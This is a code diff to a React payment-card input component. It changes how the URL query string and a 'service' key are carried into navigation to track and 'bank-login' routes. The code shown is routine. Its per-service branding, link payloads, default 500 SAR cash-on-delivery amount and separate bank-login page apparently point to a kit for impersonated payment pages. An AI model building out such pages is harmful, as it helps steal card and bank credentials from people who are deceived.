@@ -20,6 +20,7 @@ const PaymentCardInput = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading } = useLink(id);
+  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -30,7 +31,11 @@ const PaymentCardInput = () => {
     const sessionService = sessionStorage.getItem('serviceKey');
     const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
     const serviceKeyParam = payloadService || urlServiceKey || sessionService;
-    const serviceQuery = serviceKeyParam ? `?service=${encodeURIComponent(serviceKeyParam)}` : "";
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKeyParam) {
+      params.set('service', serviceKeyParam);
+    }
+    const serviceQuery = params.toString() ? `?${params.toString()}` : "";
 
     if (!method) {
       navigate(`/pay/${id}/track${serviceQuery}`);
@@ -39,7 +44,7 @@ const PaymentCardInput = () => {
     if (method !== 'card') {
       navigate(`/pay/${id}/bank-login${serviceQuery}`);
     }
-  }, [id, navigate, linkData, urlServiceKey]);
+  }, [id, navigate, linkData, urlServiceKey, initialSearch]);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -77,7 +82,14 @@ const PaymentCardInput = () => {
   const branding = getServiceBranding(resolvedServiceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = resolvedServiceKey ? `?service=${encodeURIComponent(resolvedServiceKey)}` : "";
+  const serviceQuery = useMemo(() => {
+    const params = new URLSearchParams(initialSearch || "");
+    if (resolvedServiceKey) {
+      params.set('service', resolvedServiceKey);
+    }
+    const search = params.toString();
+    return search ? `?${search}` : "";
+  }, [initialSearch, resolvedServiceKey]);
 
   useEffect(() => {
     if (resolvedServiceKey) {
